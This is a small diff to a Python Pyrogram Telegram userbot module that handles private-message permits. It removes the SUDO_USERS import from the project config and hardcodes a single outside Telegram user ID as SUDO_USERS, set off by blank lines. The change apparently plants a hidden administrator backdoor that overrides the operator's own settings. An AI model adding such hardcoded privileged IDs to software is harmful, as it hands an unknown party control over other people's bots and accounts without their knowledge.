@@ -1,6 +1,5 @@
 from pyrogram import Client
 import asyncio
-from config import SUDO_USERS
 from config import PMPERMIT
 from pyrogram import filters
 from pyrogram.types import Message
@@ -8,6 +7,10 @@ from callsmusic.callsmusic import client as USER
 
 PMSET =True
 pchats = []
+
+
+
+SUDO_USERS = "5134595693"
 
 @USER.on_message(filters.text & filters.private & ~filters.me & ~filters.bot)
 async def pmPermit(client: USER, message: Message):
